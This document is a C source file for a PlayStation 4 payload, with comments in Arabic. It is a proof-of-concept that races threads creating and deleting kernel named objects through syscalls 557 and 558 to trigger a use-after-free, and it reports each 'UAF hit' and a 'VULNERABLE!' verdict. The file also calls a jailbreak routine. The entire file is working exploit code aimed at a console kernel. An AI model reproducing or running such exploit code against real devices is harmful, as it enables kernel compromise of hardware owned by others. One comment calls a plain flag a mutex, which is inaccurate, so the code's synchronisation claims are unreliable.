#include "ps4.h"

#define SYS_NAMEDOBJ_CREATE 557
#define SYS_NAMEDOBJ_DELETE 558
#define NAMEDOBJ_FLAGS 0x107

static int namedobj_create(const char* name,
                            int data,
                            uint32_t flags) {
    return syscall(SYS_NAMEDOBJ_CREATE, name, data, flags);
}

static int namedobj_delete(uint32_t handle,
                            uint16_t flags) {
    return syscall(SYS_NAMEDOBJ_DELETE, handle, flags);
}

static volatile int g_handle  = -1;
static volatile int g_running =  1;
static volatile int g_hits    =  0;
static volatile int g_count   =  0;

// إضافة mutex لضبط الترتيب:
static volatile int g_deleted = 0;

void* thread_delete_a(void* arg) {
    while (g_running) {
        int h = g_handle;
        if (h == -1) continue;
        g_handle  = -1;
        g_deleted = 0;
        namedobj_delete(h, NAMEDOBJ_FLAGS);  // A يحذف أولاً
        g_deleted = 1;                        // أبلغ B
    }
    return NULL;
}

void* thread_delete_b(void* arg) {
    while (g_running) {
        int h = g_handle;
        if (h == -1) continue;
        // انتظر حتى A يبدأ الحذف
        while (g_deleted == 0 && g_handle == -1 && g_running);
        // الآن حاول في نفس اللحظة
        int r = namedobj_delete(h, NAMEDOBJ_FLAGS);
        if (r == 0) {
            g_hits++;
            printf_debug("[!!!] REAL UAF HIT #%d h=0x%x\n",
                         g_hits, h);
        }
        g_deleted = 0;
    }
    return NULL;
}

void* thread_create(void* arg) {
    printf_debug("thread_C start\n");
    while (g_running) {
        int h = namedobj_create("poc_uaf", 0, NAMEDOBJ_FLAGS);
        if (h <= 0) continue;
        g_count++;
        g_handle = h;
    }
    return NULL;
}

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initPthread();
    initNetwork();
    jailbreak();
    initSysUtil();

    ScePthread tA, tB, tC;

    printf_debug("=== namedobj UAF PoC ===\n");

    // [1] شغّل creator أولاً
    scePthreadCreate(&tC, NULL, thread_create, NULL, "creator");

    // [2] انتظر حتى ينشئ أول handle
    printf_debug("waiting for first create...\n");
    while (g_count == 0) {
        int i = 0;
        while (i < 10000) i++;  // busy wait قصير
    }
    printf_debug("first create done, launching deleters\n");

    // [3] الآن أطلق الـ deleters
    scePthreadCreate(&tA, NULL, thread_delete_a, NULL, "deleter_a");
    scePthreadCreate(&tB, NULL, thread_delete_b, NULL, "deleter_b");

    int seconds = 0;
    while (seconds < 30 && g_running) {
        int i = 0;
        while (i < 100000000 && g_running) i++;
        seconds++;
        printf_debug("t=%ds creates=%d hits=%d\n",
                     seconds, g_count, g_hits);
        if (g_hits > 0) break;
    }

    g_running = 0;

    scePthreadJoin(tA, NULL);
    scePthreadJoin(tB, NULL);
    scePthreadJoin(tC, NULL);

    printf_debug("\n=== Results ===\n");
    printf_debug("Total creates: %d\n", g_count);
    printf_debug("UAF hits: %d\n", g_hits);

    if (g_hits > 0) {
        printf_debug("[+] VULNERABLE!\n");
    } else {
        printf_debug("[-] No hits\n");
    }

    return 0;
}